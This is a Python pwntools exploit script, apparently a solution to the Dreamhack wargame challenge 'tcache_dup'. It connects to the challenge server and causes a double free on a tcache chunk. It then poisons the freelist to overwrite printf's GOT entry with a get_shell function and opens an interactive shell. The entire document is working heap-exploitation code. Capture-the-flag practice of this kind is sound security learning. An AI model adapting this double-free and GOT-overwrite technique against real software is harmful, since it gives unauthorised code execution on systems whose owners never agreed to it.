#!/usr/bin/python3

from pwn import *

p = remote("host1.dreamhack.games", 9648)
e = ELF("./tcache_dup")

sla = lambda t,s: p.sendlineafter(t, s)
sa = lambda t,s: p.sendafter(t, s)

def create(size, data):
    sla(">", str(1))
    sla(": ", str(size))
    sa(": ", data)

def delete(idx):
    sla("> ", str(2))
    sla(": ", str(idx))

# Make DFB
create(0x30, "dreamhack")
delete(0)
delete(0)

# Manipulate tcache freelist
create(0x30, p64(e.got['printf']))
create(0x30, p64(0x0))
create(0x30, p64(e.sym['get_shell']))

p.interactive()
